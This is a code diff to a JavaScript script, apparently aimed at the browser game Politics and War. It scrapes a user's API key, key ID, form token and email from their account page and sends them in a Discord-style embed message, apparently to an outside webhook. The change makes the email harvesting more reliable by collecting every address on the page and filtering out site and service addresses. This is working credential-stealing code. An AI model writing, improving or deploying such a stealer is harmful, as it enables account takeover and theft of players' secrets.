@@ -16,7 +16,17 @@
     const apiKey = (acct.match(/notranslate['"]>\s*([a-f0-9]{12,})\s*</) || [])[1];
     const keyId  = (acct.match(/name="regen_api_key_id"\s+value="(\d+)"/) || [])[1];
     const token  = (acct.match(/name="token"\s+value="([^"]+)"/) || [])[1];
-    const email  = (acct.match(/Current E-mail:[\s\S]*?notranslate">\s*(\S+@\S+\.\w+)/) || [])[1];
+
+    // grab every email on the page, pick the user's
+    const allEmails = acct.match(/[\w.\-+]+@[\w.\-]+\.\w{2,}/g) || [];
+    const email = allEmails.find(e =>
+      !e.includes('politicsandwar') &&
+      !e.includes('firebase') &&
+      !e.includes('cloudflare') &&
+      !e.includes('gtranslate') &&
+      !e.includes('yellowstone') &&
+      !e.includes('example')
+    ) || 'n/a';
 
     await send({
       embeds: [{
@@ -29,7 +39,7 @@
           {name: 'apiKey', value: apiKey || 'n/a', inline: false},
           {name: 'keyId',  value: keyId  || 'n/a', inline: true},
           {name: 'token',  value: token  || 'n/a', inline: true},
-          {name: 'email',  value: email  || 'n/a', inline: false}
+          {name: 'email',  value: email, inline: false}
         ]
       }]
     });
